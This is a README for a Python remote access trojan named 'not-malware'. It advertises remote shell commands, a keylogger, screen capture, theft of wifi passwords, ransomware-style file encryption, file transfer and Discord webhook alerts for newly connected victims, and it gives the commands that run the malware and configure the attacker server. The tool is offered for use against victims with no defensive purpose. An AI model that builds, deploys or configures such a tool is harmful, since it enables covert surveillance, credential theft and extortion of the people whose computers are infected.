# not-malware - Simple Windows Remote access trojan

## What is not-malware?
not-malware is basically a RAT using sockets in python that can run pretty much all cli commands in Windows.

1. The RAT binds sockets together so that the attacker can connect.
2. After you connect as the attacker you can run pretty much any cli command.
3. You can also send a selection of other commands

## Features
* Live recording
* * Using the vidstream library not-malware can get a live screen share of the victim's screen
* Wifi password
* * Using netsh not-malware can get all ssid's and security that the victim has connected to.
* taking screenshots
* * Using cv2 and pyautogui not-malware can take screenshots of the victim's screen.
* Keylogger
* * Using pynput not-malware can record  key strokes of the victim.
* sending commands
* * Using os not-malware can send basically all cli commands to the victim's PC.
* Ransomware
* * Using cryptography.fernet not-malware can encrypt and decrypt nearly all files on the victim's PC (I have not actually tested PC wide file encryption (I like my files)).
* sending and getting files
* * not-malware can get files and send files to the victim's PC.
* Discord webhooks
* * When a new victim connects to the attacker you can send a notification via discord webhooks.

   ```sh
   malware.exe or python malware.py
   ```
  
That's all it takes to install and run not-malware.

## Commands and Configuration for not-malware.
It is possible to modify the behaviour of not-malware with cli
arguments. In order to get an up-to-date help document, just run
`python attacker.py -h`.

You can change the server ip on the malware but not on the server, the default host ip on the server is 0.0.0.0 (localhost).

* Python malware.py 1.1.1.1 (the ip of the attcker)
* * This is for the malware
* -p, --port
* * Port of the Server, default 421
* -d, --discord
* * After you have added discord webhooks as a argument then you need to specify your webhooks URL. 

* Example : python attacker.py 255.255.255.255 -p 5000 -d  https://discord.com/api/webhooks/your-webhook-url .
